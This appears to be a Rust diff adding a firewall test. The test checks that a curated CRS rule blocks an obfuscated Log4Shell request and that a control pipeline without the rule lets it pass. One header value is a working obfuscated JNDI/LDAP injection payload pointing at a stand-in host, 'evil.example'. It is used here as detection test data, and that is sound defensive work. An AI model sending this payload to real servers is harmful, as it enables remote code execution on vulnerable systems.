@@ -40,6 +40,17 @@ fn log4shell_request() -> RequestContext {
     }
 }
 
+/// E-1: the same shape but with the JNDI string OBFUSCATED through a nested Log4j lookup — the
+/// literal rule 9000003 can't see it, only the obfuscation rule 9000004.
+fn log4shell_obfuscated_request() -> RequestContext {
+    let mut c = log4shell_request();
+    c.headers = vec![(
+        "X-Api-Version".to_string(),
+        "${${lower:j}ndi:ldap://evil.example/a}".to_string(),
+    )];
+    c
+}
+
 #[test]
 fn curated_module_blocks_on_the_pipeline_but_control_without_it_passes() {
     let config = blocking_config();
@@ -59,5 +70,26 @@ fn curated_module_blocks_on_the_pipeline_but_control_without_it_passes() {
     assert!(
         matches!(bare.run(&mut ctx_ctrl), PipelineVerdict::Allow),
         "without the curated module the same request must pass (control)"
+    );
+}
+
+#[test]
+fn curated_module_blocks_obfuscated_log4shell_on_the_pipeline() {
+    // E-1: obfuscated JNDI (`${${lower:j}ndi:…}`) must also block via rule 9000004, and the same
+    // request without the curated module must pass (control) — the native modules carry no Log4Shell.
+    let config = blocking_config();
+
+    let pipe = Pipeline::new(&config, vec![Box::new(CrsModule::from_source(&curated_source()))]);
+    let mut ctx = log4shell_obfuscated_request();
+    assert!(
+        !matches!(pipe.run(&mut ctx), PipelineVerdict::Allow),
+        "curated CRS must block the OBFUSCATED Log4Shell request on the datapath (E-1)"
+    );
+
+    let bare = Pipeline::new(&config, vec![]);
+    let mut ctx_ctrl = log4shell_obfuscated_request();
+    assert!(
+        matches!(bare.run(&mut ctx_ctrl), PipelineVerdict::Allow),
+        "without the curated module the same obfuscated request must pass (control)"
     );
 }
